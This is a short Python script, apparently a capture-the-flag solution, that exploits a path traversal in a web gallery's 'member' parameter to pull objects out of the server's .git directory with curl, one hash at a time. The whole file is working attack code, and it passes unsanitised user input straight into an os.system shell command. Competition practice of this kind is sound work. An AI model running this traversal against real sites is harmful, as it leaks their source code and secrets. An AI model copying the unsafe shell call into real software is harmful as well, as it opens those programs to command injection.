
import os


gitprefix = "https://art-gallery.web.actf.co/gallery?member=../.git/objects"

obj = input("Object hash: ")
objdir = obj[:2]
objfile = obj[2:]
print(objdir + "/" + objfile)

os.system("curl %s/%s/%s" % (gitprefix, objdir, objfile) + " > " + "objects/" + obj)
